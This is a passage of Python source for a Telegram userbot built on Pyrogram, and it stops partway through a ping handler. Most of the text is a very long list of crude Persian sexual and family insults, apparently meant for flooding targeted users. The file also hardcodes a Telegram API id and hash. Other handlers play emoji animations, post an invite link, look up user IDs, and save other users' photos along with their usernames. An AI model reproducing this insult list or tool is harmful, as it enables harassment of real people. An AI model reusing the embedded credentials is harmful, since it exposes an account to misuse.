
from apscheduler.schedulers.asyncio import AsyncIOScheduler
import random, asyncio, pytz
from datetime import datetime
from os import *
from time import *
from json import *
from pyrogram import *
from requests import *
from threading import Thread
from pyrogram.types import *
from pyrogram.errors import *
from pyrogram.enums import *







target, muute, game, type, list_fosh, status_time = [], [], ["off"], ["off"], ["کص مادرت", "کص ابجیت", "الهی مادرت بمیره", "کیر 47 سانتیم با کاندوم صاف به سوی کص مادرت", "تو پسر من هستی", "کیر فیل به کص مادرت", "خایه های شوهر عمت تو کص مادرت", "مادرجنده", "مادرقحبه", "کص مادرت", "خارکصه", "مادرتو گاییدم", "مادرتو سفت سفت خوردم", "کص زن عموی مادرجندت ، مادرکسته", "خارکسده", "کیر کاکا امام خمینی ساف تو کص ام الفامیلات", "الحق کص مادرت", "سلام مادرکسته", "کص خواهرت","کیرم تو خارت", "بصیک بچه کونی", "بای بده ننه پولی", "کیرم تو ننت اوبی", "نگامت کص ننه ", "کص ننه پرده ارتجاعیت", "ننتو شبی چند میدی؟", "خارتو با روغن جامد گاییدم", "کص آبجیت ", "زنا زادع ", "ننه خیابونی", "گی ننه", "آبم لا کص ننت چجوری میشه", "بالا باش ننه کیر دزد", "ننت مجلسی میزنه؟کصصصص ننت جووووون", "ننه جریده", "گی پدر زنا زادع ", "ننتو کرایه میدی؟", "شل ننه بالا باش", "خارکصده به ننت بگو رو کیرم خوش میگذره؟", "ننه توله کص ننتو جر میدم", "بیا ننتو ببر زخمش کردم", "کص ننتو بزارم یکم بخندیم", "به ننت بگو بیاد واسم پر توف بزنه خرجتونو بدم یتیم", "فلج تیز باش ننتو بیار", "ننت پر توف میزنی بابات شم؟", "اوب کونی بزن به چاک تا ننتو جلوت حامله نکردمننه کون طلا بیا بالا", "یتیم بیا بغلم ", "ننت گنگ بنگ دوس داره؟", "بیا بگامت شاد شی خار کصده", "کیرم تو کص ننت بگو باشه", "داداش دوس داری یا آبجی ننه پولی", "۵۰ میدم ننتو بدهکیرم کص آبجی کص طلاااات", "ننه پولی چند سانت دوس داری؟", "دست و پا نزن ننه کص گشاد", "ننه ساکر هویت میخوای؟", "کیر سگا تو کص آبجیت ", "از ننت بپرس آب کیر پرتقالی دوس داره؟", "پستون ننت چنده", "تخخخخ بیا بالا ادبی", "مادرت دستو پا میزنه زیرم", "ننه سکسی بیا یه ساک بزن بخندیم", "خمینی اومد جاده دهاتتونو آسفالت کرد اومدید شهر و گرنه ننت کجا کص میداد؟", "گص کش", "کس ننه", "کص ننت", "کس خواهر", "کس خوار", "کس خارت", "کس ابجیت", "کص لیس", "ساک بزن", "ساک مجلسی", "ننه الکسیس", "نن الکسیس", "ناموستو گاییدم", "ننه زنا", "کس خل", "کس مخ", "کس مغز", "کس مغذ", "خوارکس", "خوار کس", "خواهرکس", "خواهر کس", "حروم زاده", "حرومزاده", "خار کس", "تخم سگ", "پدر سگ", "پدرسگ", "پدر صگ", "پدرصگ", "ننه سگ", "نن سگ", "نن صگ", "ننه صگ", "ننه خراب", "تخخخخخخخخخ", "نن خراب", "مادر سگ", "مادر خراب", "مادرتو گاییدم", "تخم جن", "تخم سگ", "مادرتو گاییدم", "ننه حمومی", "نن حمومی", "نن گشاد", "ننه گشاد", "نن خایه خور", "تخخخخخخخخخ", "نن ممه", "کس عمت", "کس کش", "کس بیبیت", "کص عمت", "کص خالت", "کس بابا", "کس خر", "کس کون", "کس مامیت", "کس مادرن", "مادر کسده", "خوار کسده", "تخخخخخخخخخ", "ننه کس", "بیناموس", "بی ناموس", "شل ناموس", "سگ ناموس", "ننه جندتو گاییدم باو ", "چچچچ نگاییدم سیک کن پلیز D:", "ننه حمومی", "چچچچچچچ", "لز ننع", "ننه الکسیس", "کص ننت", "بالا باش", "ننت رو میگام", "کیرم از پهنا تو کص ننت", "مادر کیر دزد", "ننع حرومی", "تونل تو کص ننت", "کیر تک تک بکس تلع گلد تو کص ننت", "کص خوار بدخواه", "خوار کصده", "ننع باطل", "حروم لقمع", "ننه سگ ناموس", "منو ننت شما همه چچچچ", "ننه کیر قاپ زن", "ننع اوبی", "ننه کیر دزد", "ننه کیونی", "ننه کصپاره", "زنا زادع", "کیر سگ تو کص نتت پخخخ", "ولد زنا", "ننه خیابونی", "هیس بع کس حساسیت دارم", "کص نگو ننه سگ که میکنمتتاااا", "کص نن جندت", "ننه سگ", "ننه کونی", "ننه زیرابی", "بکن ننتم", "ننع فاسد", "ننه ساکر", "کس ننع بدخواه", "نگاییدم", "مادر سگ", "ننع شرطی", "گی ننع", "بابات شاشیدتت چچچچچچ", "ننه ماهر", "حرومزاده", "ننه کص", "کص ننت باو", "پدر سگ", "سیک کن کص ننت نبینمت", "کونده", "ننه ولو", "ننه سگ", "مادر جنده", "کص کپک زدع", "ننع لنگی", "ننه خیراتی", "سجده کن سگ ننع", "ننه خیابونی", "ننه کارتونی", "تکرار میکنم کص ننت", "تلگرام تو کس ننت", "کص خوارت", "خوار کیونی", "پا بزن چچچچچ", "مادرتو گاییدم", "گوز ننع", "کیرم تو دهن ننت", "ننع همگانی", "کیرم تو کص زیدت", "کیر تو ممهای ابجیت", "ابجی سگ", "کس دست ریدی با تایپ کردنت چچچ", "ابجی جنده", "ننع سگ سیبیل", "بده بکنیم چچچچ", "کص ناموس", "شل ناموس", "ریدم پس کلت چچچچچ", "ننه شل", "ننع قسطی", "ننه ول", "دست و پا نزن کس ننع", "ننه ولو", "خوارتو گاییدم", "محوی!؟", "ننت خوبع!؟", "کس زنت", "شاش ننع", "ننه حیاطی \\\\\/:", "نن غسلی", "کیرم تو کس ننت بگو مرسی چچچچ", "ابم تو کص ننت :\\\\\/", "فاک یور مادر خوار سگ پخخخ", "کیر سگ تو کص ننت", "کص زن", "ننه فراری", "بکن ننتم من باو جمع کن ننه جنده \\\\\/:::", "ننه جنده بیا واسم ساک بزن", "حرف نزن که نکنمت هااا :|", "کیر تو کص ننت😐", "کص کص کص ننت", "کصصصص ننت جووون", "سگ ننع", "کص خوارت", "کیری فیس", "کلع کیری", "تیز باش سیک کن نبینمت", "فلج تیز باش چچچ", "بیا ننتو ببر", "بکن ننتم باو ", "کیرم تو بدخواه", "چچچچچچچ", "ننه جنده", "ننه کص طلا", "ننه کون طلا", "کس ننت بزارم بخندیم!؟", "کیرم دهنت", "مادر خراب", "ننه کونی", "هر چی گفتی تو کص ننت خخخخخخخ", "کص ناموست بای", "کص ننت بای :\\\\\/\\\\\/", "کص ناموست باعی تخخخخخ", "کون گلابی!", "ریدی آب قطع", "کص کن ننتم کع", "نن کونی", "نن خوشمزه", "ننه لوس", " نن یه چشم ", "ننه چاقال", "ننه جینده", "ننه حرصی ", "نن لشی", "ننه ساکر", "نن تخمی", "ننه بی هویت", "نن کس", "نن سکسی", "نن فراری", "لش ننه", "سگ ننه", "شل ننه", "ننه تخمی", "ننه تونلی", "ننه کوون", "نن خشگل", "نن جنده", "نن ول ", "نن سکسی", "نن لش", "کس نن ", "نن کون", "نن رایگان", "نن خاردار", "ننه کیر سوار", "نن پفیوز", "نن محوی", "ننه بگایی", "ننه بمبی", "ننه الکسیس", "نن خیابونی", "نن عنی", "نن ساپورتی", "نن لاشخور", "ننه طلا", "ننه عمومی", "ننه هر جایی", "نن دیوث", "تخخخخخخخخخ", "نن ریدنی", "نن بی وجود", "ننه سیکی", "ننه کییر", "نن گشاد", "نن پولی", "نن ول", "نن هرزه", "ننه لاشی کیری", "ننه ویندوزی", "نن تایپی", "نن برقی", "نن شاشی", "ننه درازی", "شل ننع", "یکن ننتم که", "کس خوار بدخواه", "آب چاقال", "ننه جریده", "ننه سگ سفید", "آب کون", "ننه 85", "ننه سوپری", "بخورش", "کس ن", "خوارتو گاییدم", "خارکسده", "گی پدر", "آب چاقال", "زنا زاده", "زن جنده", "سگ پدر", "مادر جنده", "ننع کیر خور", "چچچچچ", "تیز بالا", "ننه سگو با کسشر در میره", "کیر سگ تو کص ننت", "kos kesh", "kir", "kiri", "nane lashi", "kos", "kharet", "blis kirmo", "اوبی کونی هرزه", "کیرم لا کص خارت", "کیری", "ننه لاشی", "ممه", "کص", "کیر", "بی خایه", "ننه لش", "بی پدرمادر", "خارکصده", "مادر جنده", "کصکش", "کیرم کون مادرت", "بالا باش کیرم کص مادرت", "مادرتو میگام نوچه جون بالا??", "اب خارکصته تند تند تایپ کن ببینم", "مادرتو میگام بخای فرار کنی", "لال شو", "کیرم تو خارت", "بصیک بچه کونی", "بای بده ننه پولی", "کیرم تو ننت اوبی", "نگامت کص ننه ", "کص ننه پرده ارتجاعیت", "ننتو شبی چند میدی؟", "خارتو با روغن جامد گاییدم", "کص آبجیت ", "زنا زادع ", "ننه خیابونی", "گی ننه", "آبم لا کص ننت چجوری میشه", "بالا باش ننه کیر دزد", "ننت مجلسی میزنه؟", "کصصصص ننت جووووون", "ننه جریده", "گی پدر زنا زادع ", "ننتو کرایه میدی؟", "شل ننه بالا باش", "خارکصده به ننت بگو رو کیرم خوش میگذره؟", "ننه توله کص ننتو جر میدم", "بیا ننتو ببر زخمش کردم", "کص ننتو بزارم یکم بخندیم", "به ننت بگو بیاد واسم پر توف بزنه خرجتونو بدم یتیم", "ننه کون طلا بیا بالا", "یتیم بیا بغلم ", "ننت گنگ بنگ دوس داره؟", "بیا بگامت شاد شی خار کصده", "کیرم تو کص ننت بگو باشه", "داداش دوس داری یا آبجی ننه پولی", "۵۰ میدم ننتو بده", "فلج تیز باش ننتو بیار", "کیرم کص آبجی کص طلاااات", "ننه پولی چند سانت دوس داری؟", "دست و پا نزن ننه کص گشاد", "ننه ساکر هویت میخوای؟", "کیر سگا تو کص آبجیت ", "از ننت بپرس آب کیر پرتقالی دوس داره؟", "پستون ننت چنده", "تخخخخ بیا بالا ادبی", "مادرت دستو پا میزنه زیرم", "ننه سکسی بیا یه ساک بزن بخندیم", "خمینی اومد جاده دهاتتونو آسفالت کرد اومدید شهر و گرنه ننت کجا کص میداد؟", "کیرم تا ته و از پهنا تو کص مادرت", "کص ناموس مادرت", "مادر کص پاپیونی ", "مادر جنده حروم تخمی", "اوبی زاده حقیر", "بابات زیر کیرم بزرگ شد", "اسمم رو کون مادرت تتو شده", "خیخیخیخیخی", "چچچچچچچچ", "زجه بزن ناموس گلابی", "مادرت کیرمه ", "بابات منم ", "تخم سگ حروم زاده ", "کص ناموست ", "خواهرتو گاییدم", "ریدم بهت بیشعور", " بی شرف", " ریدم تو مغزت", " بی ارزش", " کصکش", " ریدم توی ناموست", " بی ناموس", " مادرجنده", " خواهر کصکش", " ریدم توی کل طایفت", " بی ناموس برو", " خوشم ازت نمیاد کصکش", " تو کصکشی", " برو خواهر جنده", "برو مادرجنده", " برو برادر کونی", " کونکش", "عوض بی ناموس", "ریدم تو قبر مادرت", "ریدم تو قبر پدرت", " ریدم تو قبرت", " ریدم تو زاتت", " ریدم تو خواهر جنده", " خواهر جندت خوبه", " مادر جندت خوبه", " پدر کونکشت خوبه", "برادر کونیت خوب", " پدرسگ", " مادر سگ", " برادر سگ", " خواهر سگ", " خواهر جندت چی", " مادر جندت چی", " پدر کونیت چی", " برادر کونیت چی", " اره جنده ها", " تو جنده ای", " تو کونی ای", " توی کصکشی", " خوشم از جنده ها نمیاد", " خواهرت جنده شده", " مادرت جنده شده", " جنده برو خودت رو جمع کن", " مامانت امشب روی کی هستش", " خواهرت پیش کیه", " برادرت داره کجا کون میده", " بابای قرمساقت کو", " خواهرت امشب روی کی هستش", " مادرت امشب روی کی خوابیده", "ننت پر توف میزنی بابات شم؟", "اوب کونی بزن به چاک تا ننتو جلوت حامله نکردم", " ریدم بهت", " بیشعور", " بی شرف", " ریدم تو مغزت", " بی ارزش", " کصکش", " ریدم توی ناموست", " بی ناموس", " مادرجنده", " خواهر کصکش", " ریدم توی کل طایفت", " بی ناموس برو", " خوشم ازت نمیاد کصکش", " تو کصکشی", " برو خواهر جنده", " برو مادرجنده", " برو برادر کونی", " کونکش", " عوض بی ناموس", " ریدم تو قبر مادرت", " ریدم تو قبر پدرت", " ریدم تو قبرت", " ریدم تو زاتت", " ریدم تو خواهر جنده", " خواهر جندت خوبه", " مادر جندت خوبه", " پدر کونکشت خوبه", " برادر کونیت خوب", " پدرسگ", " مادر سگ", " برادر سگ", " خواهر سگ", " خواهر جندت چی", " مادر جندت چی", " پدر کونیت چی", " برادر کونیت چی", " اره جنده ها", " تو جنده ای", " تو کونی ای", " توی کصکشی", " خوشم از جنده ها نمیاد", " خواهرت جنده شده", " مادرت جنده شده", " جنده برو خودت رو جمع کن", " مامانت امشب روی کی هستش", " خواهرت پیش کیه", " برادرت داره کجا کون میده", " بابای قرمساقت کو", " خواهرت امشب روی کی هستش", " مادرت امشب روی کی خوابیده", "کیرم کون مادرت", "بالا باش کیرم کص مادرت", "مادرتو میگام نوچه جون بالا", "اب خارکصته تند تند تایپ کن ببینم", "مادرتو میگام بخای فرار کنی", "لال شو دیگه نوچه", "مادرتو میگام اف بشی", "کیرم کون مادرت", "کیرم کص مص مادرت بالا", "کیرم تو چشو چال مادرت", "کون مادرتو میگام بالا", "بیناموس  خسته شدی؟", "نبینم خسته بشی بیناموس", "ننتو میکنم", "کیرم کون مادرت ", "صلف تو کصننت بالا", "بیناموس بالا باش بهت میگم", "کیر تو مادرت", "کص مص مادرتو بلیسم؟", "کص مادرتو چنگ بزنم؟", "به خدا کصننت بالا ", "مادرتو میگام ", "کیرم کون مادرت بیناموس", "مادرجنده بالا باش", "بیناموس تا کی میخای سطحت گح باشه", "اپدیت شو بیناموس خز بود", "کیرم از پهنا تو ننت", "و اما تو بیناموس چموش", "تو یکیو مادرتو میکنم", "کیرم تو ناموصت ", "کیر تو ننت", "ریش روحانی تو ننت", "کیر تو مادرت", "کص مادرتو مجر بدم", "صلف تو ننت", "بات تو ننت ", "مامانتو میکنم بالا", "کیر ترکا به ناموست", "سطحشو نگا", "تایپ کن بیناموس", "خشاب؟", "کیرم کون مادرت بالا", "بیناموس نبینم خسته بشی", "مادرتو بگام؟", "گح تو سطحت شرفت رف", "بیناموس شرفتو نابود کردم یه کاری کن", "وای کیرم تو سطحت", "بیناموس روانی شدی", "روانیت کردما", "مادرتو کردم کاری کن", "تایپ تو ننت", "بیپدر بالا باش", "و اما تو  خر", "ننتو میکنم بالا باش", "کیرم لب مادرت بالا", "چطوره بزنم نصلتو گح کنم", "داری تظاهر میکنی ارومی ولی مادرتو کوص کردم", "مادرتو کردم بیغیرت", "هرزه", "وای خدای من اینو نگا", "کیر تو کصننت", "ننتو بلیسم", "منو نگا بیناموس", "کیر تو ننت بسه دیگه", "خسته شدی؟", "ننتو میکنم خسته بشی", "وای دلم کون مادرت بگام", "اف شو احمق", "بیشرف اف شو بهت میگم", "مامان جنده اف شو", "کص مامانت اف شو", "کص لش وا ول کن اینجوری بگو؟", "ای بیناموس چموش", "خارکوصته ای ها", "مامانتو میکنم اف نشی", "گح تو ننت", "سطح یه گح صفتو", "گح کردم تو نصلتا", "چه رویی داری بیناموس", "ناموستو کردم", "رو کص مادرت کیر کنم؟", "نوچه بالا", "کیرم تو ناموصتاا", "یا مادرتو میگام یا اف میشی", "لالشو دیگه", "بیناموس", "مادرکصته", "ناموص کصده", "وای بدو ببینم میرسی", "کیرم کون مادرت چیکار میکنی اخه", "خارکصته بالا دیگه عه", "کیرم کصمادرت", "کیرم کون ناموصد", "بیناموس من خودم خسته شدم توچی؟", "ای شرف ندار", "مامانتو کردم بیغیرت", "و اما مادر جندت", "تو یکی زیر باش", "اف شو", "خارتو کوص میکنم", "کوصناموصد", "ناموص کونی", "خارکصته ی بۍ غیرت", "شرم کن بیناموس", "مامانتو کرد ", "ای مادرجنده", "بیغیرت", "کیرتو ناموصت", "بیناموس نمیخای اف بشی؟", "ای خارکوصته", "لالشو دیگه", "همه کس کونی", "حرامزاده", "مادرتو میکنم", "بیناموس", "کصشر", "اف شو مادرکوصته", "خارکصته کجایی", "ننتو کردم کاری نمیکنی؟", "کیرتو مادرت لال", "کیرتو ننت بسه", "کیرتو شرفت", "مادرتو میگام بالا", "کیر تو مادرت", "کونی ننه ی حقیر زاده", "وقتی تو کص ننت تلمبه های سرعتی میزدم تو کمرم بودی بعد الان برا بکنه ننت شاخ میشی هعی   ", "تو یه کص ننه ای ک ننتو به من هدیه کردی تا خایه مالیمو کنی مگ نه خخخخ", "انگشت فاکم تو کونه ناموست", "تخته سیاهه مدرسه با معادلات ریاضیه روش تو کص ننت اصلا خخخخخخخ ", "کیرم تا ته خشک خشک با کمی فلفل روش تو کص خارت ", "کص ننت به صورت ضربدری ", "کص خارت به صورت مستطیلی", "رشته کوه آلپ به صورت زنجیره ای تو کص نسلت خخخخ ", "10 دقیقه بیشتر ابم میریخت تو کس ننت این نمیشدی", "فکر کردی ننت یه بار بهمـ داده دیگه شاخی", "اگر ننتو خوب کرده بودم حالا تو اینجوری نمیشدی"
], ['off']
app = Client("ThePurea" , api_id = "5888972" , api_hash = "8c6c75ac3bb436c548e56e93020cb738")


@app.on_message(filters.me & filters.regex('(?i)^خوبی$'))
async def hert(client, message):
    msg_id = message.id
    chat_id = message.chat.id
    await app.edit_message_text(chat_id, msg_id, "`خوبی؟`")



@app.on_message(filters.me & filters.regex('(?i)^قلب$'))
async def hert(client, message):
    msg_id = message.id
    chat_id = message.chat.id
    await app.edit_message_text(chat_id, msg_id, "`❤️`")
    await asyncio.sleep(1.6)
    await app.edit_message_text(chat_id, msg_id, "`💙`")
    await asyncio.sleep(1.2)
    await app.edit_message_text(chat_id, msg_id, "`💜`‌")
    await asyncio.sleep(1.2)
    await app.edit_message_text(chat_id, msg_id, "`❤`️‌")
    await asyncio.sleep(1.2)
    await app.edit_message_text(chat_id, msg_id, "`💐`")
    await asyncio.sleep(1.2)
    await app.edit_message_text(chat_id, msg_id, "️‌`🌹`")
    await asyncio.sleep(1.2)
    await app.edit_message_text(chat_id, msg_id, "`🥀‌`")
    await asyncio.sleep(1.2)
    await app.edit_message_text(chat_id, msg_id, "**قلبی**‌")
    await asyncio.sleep(1.2)
    await app.edit_message_text(chat_id, msg_id, "`🫀`")
    await app.edit_message_text(chat_id, msg_id, "`❤️`")
    await asyncio.sleep(1.6)
    await app.edit_message_text(chat_id, msg_id, "`💙`")
    await asyncio.sleep(1.2)
    await app.edit_message_text(chat_id, msg_id, "`💜`‌")
    await asyncio.sleep(1.2)
    await app.edit_message_text(chat_id, msg_id, "`❤`️‌")
    await asyncio.sleep(1.2)
    await app.edit_message_text(chat_id, msg_id, "`💐`")
    await asyncio.sleep(1.2)
    await app.edit_message_text(chat_id, msg_id, "️‌`🌹`")
    await asyncio.sleep(1.2)
    await app.edit_message_text(chat_id, msg_id, "`🥀‌`")
    await asyncio.sleep(1.2)
    await app.edit_message_text(chat_id, msg_id, "**قلبی**‌")
    await asyncio.sleep(1.2)
    await app.edit_message_text(chat_id, msg_id, "`🫀`")


    await app.edit_message_text(chat_id, msg_id, "`❤️`")
    await asyncio.sleep(1.6)
    await app.edit_message_text(chat_id, msg_id, "`💙`")
    await asyncio.sleep(1.2)
    await app.edit_message_text(chat_id, msg_id, "`💜`‌")
    await asyncio.sleep(1.2)
    await app.edit_message_text(chat_id, msg_id, "`❤`️‌")
    await asyncio.sleep(1.2)
    await app.edit_message_text(chat_id, msg_id, "`💐`")
    await asyncio.sleep(1.2)
    await app.edit_message_text(chat_id, msg_id, "️‌`🌹`")
    await asyncio.sleep(1.2)
    await app.edit_message_text(chat_id, msg_id, "`🥀‌`")
    await asyncio.sleep(1.2)
    await app.edit_message_text(chat_id, msg_id, "**قلبی**‌")
    await asyncio.sleep(1.2)
    await app.edit_message_text(chat_id, msg_id, "`🫀`")
@app.on_message(filters.me & filters.regex('(?i)^فدات'))
async def hert(client, message):
    msg_id = message.id
    chat_id = message.chat.id
    await app.edit_message_text(chat_id, msg_id, "`😈`")
    await asyncio.sleep(1.2)
    await app.edit_message_text(chat_id, msg_id, "`🫀`")
    await asyncio.sleep(1.2)
    await app.edit_message_text(chat_id, msg_id, "`💜`‌")
    await asyncio.sleep(1.2)
    await app.edit_message_text(chat_id, msg_id, "`🤠`️‌")
    await asyncio.sleep(1.2)
    await app.edit_message_text(chat_id, msg_id, "`🌚`")
    await asyncio.sleep(1.2)
    await app.edit_message_text(chat_id, msg_id, "️‌`🫂`")
    await asyncio.sleep(1.2)
    await app.edit_message_text(chat_id, msg_id, "`🌹`")
    await asyncio.sleep(1.2)
    await app.edit_message_text(chat_id, msg_id, "`🫀`")
    await app.edit_message_text(chat_id, msg_id, "`😈`")
    await asyncio.sleep(1.2)
    await app.edit_message_text(chat_id, msg_id, "`🫀`")
    await asyncio.sleep(1.2)
    await app.edit_message_text(chat_id, msg_id, "`💜`‌")
    await asyncio.sleep(1.2)
    await app.edit_message_text(chat_id, msg_id, "`🤠`️‌")
    await asyncio.sleep(1.2)
    await app.edit_message_text(chat_id, msg_id, "`🌚`")
    await asyncio.sleep(1.2)
    await app.edit_message_text(chat_id, msg_id, "️‌`🫂`")
    await asyncio.sleep(1.2)
    await app.edit_message_text(chat_id, msg_id, "`🌹`")
    await asyncio.sleep(1.2)
    await app.edit_message_text(chat_id, msg_id, "`🫀`")
    await app.edit_message_text(chat_id, msg_id, "`😈`")
    await asyncio.sleep(1.2)
    await app.edit_message_text(chat_id, msg_id, "`🫀`")
    await asyncio.sleep(1.2)
    await app.edit_message_text(chat_id, msg_id, "`💜`‌")
    await asyncio.sleep(1.2)
    await app.edit_message_text(chat_id, msg_id, "`🤠`️‌")
    await asyncio.sleep(1.2)
    await app.edit_message_text(chat_id, msg_id, "`🌚`")
    await asyncio.sleep(1.2)
    await app.edit_message_text(chat_id, msg_id, "️‌`🫂`")
    await asyncio.sleep(1.2)
    await app.edit_message_text(chat_id, msg_id, "`🌹`")
    await asyncio.sleep(1.2)
    await app.edit_message_text(chat_id, msg_id, "`🫀`")        
    await asyncio.sleep(1.2)
    await app.edit_message_text(chat_id, msg_id, "**fadat**‌")
    
@app.on_message(filters.me & filters.regex('(?i)^تف'))
async def hert(client, message):
    msg_id = message.id
    chat_id = message.chat.id
    await app.edit_message_text(chat_id, msg_id, "`💦تف `") 
    


    

@app.on_message(filters.me & filters.regex('(?i)^بفرست'))
async def hert(client, message):
    msg_id = message.id
    chat_id = message.chat.id
    await app.edit_message_text(chat_id, msg_id, "https://t.me/+3kC6d3UgQyMyOGU0") 
             
                        
          
                
@app.on_message(filters.me & filters.regex('(?i)^bk$'))
async def bk(client, message):
    msg_id = message.id
    chat_id = message.chat.id
    bk1 = "\n😂😂😂          😂         😂\n😂         😂      😂       😂\n😂           😂    😂     😂\n😂        😂       😂   😂\n😂😂😂          😂😂\n😂         😂      😂   😂\n😂           😂    😂      😂\n😂           😂    😂        😂\n😂        😂       😂          😂\n😂😂😂          😂            😂\n"
    bk2 = "\n🤤🤤🤤          🤤         🤤\n🤤         🤤      🤤       🤤\n🤤           🤤    🤤     🤤\n🤤        🤤       🤤   🤤\n🤤🤤🤤          🤤🤤\n🤤         🤤      🤤   🤤\n🤤           🤤    🤤      🤤\n🤤           🤤    🤤        🤤\n🤤        🤤       🤤          🤤\n🤤🤤🤤          🤤            🤤\n"
    bk3 = "\n💩💩💩          💩         💩\n💩         💩      💩       💩\n💩           💩    💩     💩\n💩        💩       💩   💩\n💩💩💩          💩💩\n💩         💩      💩   💩\n💩           💩    💩      💩\n💩           💩    💩        💩\n💩        💩       💩          💩\n💩💩💩          💩            💩\n"
    bk4 = "\n🌹🌹🌹          🌹         🌹\n🌹         🌹      🌹       🌹\n🌹           🌹    🌹     🌹\n🌹        🌹       🌹   🌹\n🌹🌹🌹          🌹🌹\n🌹         🌹      🌹   🌹\n🌹           🌹    🌹      🌹\n🌹           🌹    🌹        🌹\n🌹        🌹       🌹          🌹\n🌹🌹🌹          🌹            🌹\n"
    bk5 = "\n💀💀💀          💀         💀\n💀         💀      💀       💀\n💀           💀    💀     💀\n💀        💀       💀   💀\n💀💀💀          💀💀\n💀         💀      💀   💀\n💀           💀    💀      💀\n💀           💀    💀        💀\n💀        💀       💀          💀\n💀💀💀          💀            💀\n"
    bk6 = "\n🌑🌑🌑          🌑         🌑\n🌑         🌑      🌑       🌑\n🌑           🌑    🌑     🌑\n🌑        🌑       🌑   🌑\n🌑🌑🌑          🌑🌑\n🌑         🌑      🌑   🌑\n🌑           🌑    🌑      🌑\n🌑           🌑    🌑        🌑\n🌑        🌑       🌑          🌑\n🌑🌑🌑          🌑            🌑\n"
    bk7 = "\n🌒🌒🌒          🌒         🌒\n🌒         🌒      🌒       🌒\n🌒           🌒    🌒     🌒\n🌒        🌒       🌒   🌒\n🌒🌒🌒          🌒🌒\n🌒         🌒      🌒   🌒\n🌒           🌒    🌒      🌒\n🌒           🌒    🌒        🌒\n🌒        🌒       🌒          🌒\n🌒🌒🌒          🌒            🌒\n"
    bk8 = "\n🌓🌓🌓          🌓         🌓\n🌓         🌓      🌓       🌓\n🌓           🌓    🌓     🌓\n🌓        🌓       🌓   🌓\n🌓🌓🌓          🌓🌓\n🌓         🌓      🌓   🌓\n🌓           🌓    🌓      🌓\n🌓           🌓    🌓        🌓\n🌓        🌓       🌓          🌓\n🌓🌓🌓          🌓            🌓\n"
    bk9 = "\n🌔🌔🌔          🌔         🌔\n🌔         🌔      🌔       🌔\n🌔           🌔    🌔     🌔\n🌔        🌔       🌔   🌔\n🌔🌔🌔          🌔🌔\n🌔         🌔      🌔   🌔\n🌔           🌔    🌔      🌔\n🌔           🌔    🌔        🌔\n🌔        🌔       🌔          🌔\n🌔🌔🌔          🌔            🌔\n"
    bk10 = "\n🌕🌕🌕          🌕         🌕\n🌕         🌕      🌕       🌕\n🌕           🌕    🌕     🌕\n🌕        🌕       🌕   🌕\n🌕🌕🌕          🌕🌕\n🌕         🌕      🌕   🌕\n🌕           🌕    🌕      🌕\n🌕           🌕    🌕        🌕\n🌕        🌕       🌕          🌕\n🌕🌕🌕          🌕            🌕\n"
    bk11 = "\n🌖🌖🌖          🌖         🌖\n🌖         🌖      🌖       🌖\n🌖           🌖    🌖     🌖\n🌖        🌖       🌖   🌖\n🌖🌖🌖          🌖🌖\n🌖         🌖      🌖   🌖\n🌖           🌖    🌖      🌖\n🌖           🌖    🌖        🌖\n🌖        🌖       🌖          🌖\n🌖🌖🌖          🌖            🌖\n"
    bk12 = "\n🌗🌗🌗          🌗         🌗\n🌗         🌗      🌗       🌗\n🌗           🌗    🌗     🌗\n🌗        🌗       🌗   🌗\n🌗🌗🌗          🌗🌗\n🌗         🌗      🌗   🌗\n🌗           🌗    🌗      🌗\n🌗           🌗    🌗        🌗\n🌗        🌗       🌗          🌗\n🌗🌗🌗          🌗            🌗\n"
    bk13 = "\n🌘🌘🌘          🌘         🌘\n🌘         🌘      🌘       🌘\n🌘           🌘    🌘     🌘\n🌘        🌘       🌘   🌘\n🌘🌘🌘          🌘🌘\n🌘         🌘      🌘   🌘\n🌘           🌘    🌘      🌘\n🌘           🌘    🌘        🌘\n🌘        🌘       🌘          🌘\n🌘🌘🌘          🌘            🌘\n"
    bk14 = "\n🌙🌙🌙          🌙         🌙\n🌙         🌙      🌙       🌙\n🌙           🌙    🌙     🌙\n🌙        🌙       🌙   🌙\n🌙🌙🌙          🌙🌙\n🌙         🌙      🌙   🌙\n🌙           🌙    🌙      🌙\n🌙           🌙    🌙        🌙\n🌙        🌙       🌙          🌙\n🌙🌙🌙          🌙            🌙\n"
    bk15 = "\n🪐🪐🪐          🪐         🪐\n🪐         🪐      🪐       🪐\n🪐           🪐    🪐     🪐\n🪐        🪐       🪐   🪐\n🪐🪐🪐          🪐🪐\n🪐         🪐      🪐   🪐\n🪐           🪐    🪐      🪐\n🪐           🪐    🪐        🪐\n🪐        🪐       🪐          🪐\n🪐🪐🪐          🪐            🪐\n"
    await app.edit_message_text(chat_id, msg_id, bk1)
    await asyncio.sleep(1.5)
    await app.edit_message_text(chat_id, msg_id, bk2)
    await asyncio.sleep(1.5)
    await app.edit_message_text(chat_id, msg_id, bk3)
    await asyncio.sleep(1.5)
    await app.edit_message_text(chat_id, msg_id, bk4)
    await asyncio.sleep(1.5)
    await app.edit_message_text(chat_id, msg_id, bk5)
    await asyncio.sleep(1.5)
    await app.edit_message_text(chat_id, msg_id, bk6)
    await asyncio.sleep(1.5)
    await app.edit_message_text(chat_id, msg_id, bk7)
    await asyncio.sleep(1.5)
    await app.edit_message_text(chat_id, msg_id, bk8)
    await asyncio.sleep(1.5)
    await app.edit_message_text(chat_id, msg_id, bk9)
    await asyncio.sleep(1.5)
    await app.edit_message_text(chat_id, msg_id, bk10)
    await asyncio.sleep(1.5)
    await app.edit_message_text(chat_id, msg_id, bk11)
    await asyncio.sleep(1.5)
    await app.edit_message_text(chat_id, msg_id, bk12)
    await asyncio.sleep(1.5)
    await app.edit_message_text(chat_id, msg_id, bk13)
    await asyncio.sleep(1.5)
    await app.edit_message_text(chat_id, msg_id, bk14)
    await asyncio.sleep(1.5)
    await app.edit_message_text(chat_id, msg_id, bk15)





@app.on_message(filters.me & filters.regex('(?i)^وایسا$'))
async def download_picture(client, message):
    url = await app.download_media(message.reply_to_message.photo.file_id)
    await app.send_photo("me", url, caption=str("@"+message.reply_to_message.from_user.username))
    remove(url)




@app.on_message(filters.me & filters.regex('(?i)^pv$'))
async def pv(client, message):
    msg_id = message.id
    chat_id = message.chat.id
    info = await app.get_users(chat_id)
    text = f"""
+ **CHAT_ID** : `{info.id}`
+ **USERNAME** : @`{info.username}`
+ **DATABASE** : `{info.dc_id}`
"""
    await app.edit_message_text(chat_id, msg_id, str(text))





@app.on_message(filters.me & filters.regex('(?i)^Ping$'))
async def ping(client, message):
    msg_id = message.id
    chat_id = message.chat.id
